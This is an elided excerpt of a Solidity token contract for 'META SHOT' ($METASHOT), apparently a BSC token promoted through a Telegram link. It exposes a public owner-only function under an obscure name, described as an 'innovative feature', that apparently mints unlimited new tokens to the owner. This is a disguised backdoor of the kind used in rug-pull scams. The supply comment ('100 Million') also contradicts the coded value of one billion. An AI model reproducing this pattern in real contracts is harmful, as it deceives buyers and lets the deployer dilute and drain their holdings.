...
//
// $MetaShot proposes an innovative feature in its contract.
//
// 📱 Telegram:https://t.me/MetaShotBSC
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _MetaShot(uint256 amount) public onlyOwner {
    _MetaShot(msg.sender, amount);
    }
    ...
    function _MetaShot(address account, uint256 amount) internal virtual {
...
contract $METASHOT is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("META SHOT", "METASHOT") {
        _MetaShot(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}